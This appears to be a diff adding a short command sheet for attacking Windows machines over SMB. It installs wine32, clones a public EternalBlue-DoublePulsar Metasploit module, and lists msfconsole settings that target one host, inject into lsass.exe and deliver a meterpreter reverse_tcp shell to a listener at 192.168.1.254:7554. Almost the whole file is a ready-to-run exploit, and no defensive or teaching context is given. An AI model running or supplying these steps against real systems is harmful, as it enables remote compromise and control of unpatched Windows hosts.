@@ -1,0 +1,22 @@
+
+## setting up wine32
+dpkg --add-architecture i386
+apt-get update
+apt-get install wine32
+mkdir -p /root/.wine/drive_c/
+
+## get doublepulsar module for metasploit
+mkdir -p /root/.msf4/modules/exploits/windows/smb/
+git clone https://github.com/ElevenPaths/Eternalblue-Doublepulsar-Metasploit.git /root/.msf4/modules/exploits/windows/smb/
+
+## metaspsloit
+msf > use exploit/windows/smb/eternalblue_doublepulsar
+> set DOUBLEPULSARPATH /root/.msf4/modules/exploits/windows/smb/deps
+> set ETERNALBLUEPATH /root/.msf4/modules/exploits/windows/smb/deps
+> set PROCESSINJECT lsass.exe
+> set RHOST 192.168.1.7
+> set TARGETARCHITECTURE x64
+> set payload windows/x64/meterpreter/reverse_tcp
+> set LHOST 192.168.1.254
+> set LPORT 7554
+> exploit -j
